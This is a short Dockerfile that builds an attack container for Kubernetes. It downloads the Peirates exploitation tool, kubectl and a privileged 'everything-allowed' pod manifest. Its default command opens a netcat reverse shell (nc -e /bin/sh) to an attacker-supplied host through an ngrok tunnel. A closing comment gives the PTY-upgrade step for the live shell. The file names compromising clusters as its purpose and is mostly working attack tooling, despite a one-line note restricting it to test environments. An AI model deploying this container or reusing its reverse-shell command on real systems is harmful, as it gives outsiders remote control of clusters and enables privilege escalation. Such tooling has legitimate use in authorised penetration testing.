FROM bash:latest
# Don't use outside of test environments
# Install Python3 to upgrade TTY and curl to fetch kubectl
RUN apk add --update python3 curl
# Fetch and unpack Peirates, kubectl and "a magic pod" to compromise K8s internally
RUN wget https://github.com/inguardians/peirates/releases/download/v1.1.16/peirates-linux-amd64.tar.xz -O /tmp/peirates.tar.xz
RUN cd /tmp && tar -xf peirates.tar.xz && rm peirates.tar.xz
RUN wget https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml -o /tmp/priv.yaml
RUN curl -L "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" -o /tmp/kubectl
RUN chmod +x /tmp/kubectl
# Change part 2 and 3 to your own ngrok TCP tunnel
CMD ["nc","PUT IP OR FQDN HERE","PUT PORT HERE","-e","/bin/sh"]
# First step after getting reverse shell : python3 -c "import pty;pty.spawn('/usr/local/bin/bash')"
